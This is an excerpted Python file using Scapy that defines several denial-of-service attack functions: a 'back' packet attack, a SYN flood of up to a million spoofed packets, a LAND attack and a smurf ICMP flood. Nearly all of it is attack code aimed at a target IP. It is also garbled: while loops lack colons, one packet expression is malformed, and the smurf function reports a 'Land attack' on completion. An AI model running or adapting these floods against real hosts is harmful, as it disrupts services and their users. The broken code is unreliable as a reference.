...
def back(payload, target_ip, target_port=80):
    # Given a URL, attempt to go into root? If failed at attempt 1, don't try anymore?
    back_attack = IP(src="127.0.0.1", dst=target_ip) / TCP(flags="S", sport=RandShort() / Raw(payload=payload), dport=int(target_port), timeout=2)
...
def syn_flood(target_ip, target_port, packets_send=1000000):
    ...
    while count < packets_send:
        ...
        a = IP(id=1111, ttl=99, src="127.0.0.1", dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
...
def land(target_ip, target_port, packets_send=10000):
    count = 0
    while count < packets_send
        send(IP(src=target_ip, dst=target_ip) / UDP(sport=target_port, dport=target_port) / Raw(load="LAND ATTACK"))
        count = count + 1
...
def smurf(source_ip, target_ip, packets_send=10000):
    count = 0
    while count < packets_send
        send(IP(src=source_ip, dst=target_ip) / ICMP())
        count = count + 1
    print("Land attack complete!")
